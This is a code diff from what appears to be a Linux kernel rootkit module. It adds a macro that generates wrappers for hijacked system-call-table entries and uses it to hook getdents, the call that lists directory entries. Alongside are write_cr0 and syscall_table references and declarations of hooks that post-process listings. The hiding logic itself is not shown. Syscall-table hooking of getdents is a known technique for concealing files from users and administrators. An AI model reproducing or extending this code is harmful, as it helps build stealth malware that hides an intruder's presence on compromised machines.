@@ -9,6 +9,7 @@
 #include <linux/types.h>
 #include <asm/paravirt.h> // write_cr0
 #include <linux/slab.h>		// kmalloc()
+#include <linux/syscalls.h> //__MAP, __SC_DECL
 
 #include "hooks.h"
 #include "config.h"
@@ -37,6 +38,25 @@ struct linux_dirent64 {
 };
 
 unsigned long *syscall_table = NULL;
+
+//HOOK DEFINING
+//similar to the way kernel defines syscalls using SYSCALL_DEFINEx
+//TESTING----------------------------------------------------------------------
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
+#define hook_define(n_args, ret_type, syscall_name, ...) \
+	asmlinkage ret_type (*sys_##syscall_name##_orig)(__MAP(n_args, __SC_DECL, __VA_ARGS__));  \
+	asmlinkage ret_type sys_##syscall_name##_hook(__MAP(n_args, __SC_DECL, __VA_ARGS__)){     \
+		ret_type ret = sys_##syscall_name##_orig(__MAP(n_args, __SC_ARGS, __VA_ARGS__));      \
+		return sys_##syscall_name##_do_hook(__MAP(n_args, __SC_ARGS, __VA_ARGS__), ret);      \
+	}
+
+#else
+//TODO
+
+#endif
+hook_define(3, long, getdents, unsigned int, fd, struct linux_dirent __user*, dirent, unsigned int, count);
+//ENDTESTING-------------------------------------------------------------------
+
 
 asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user* dirent, unsigned int count, long ret);
 asmlinkage long sys_getdents64_do_hook(unsigned int fd, struct linux_dirent64 __user* dirent, unsigned int count, long ret);
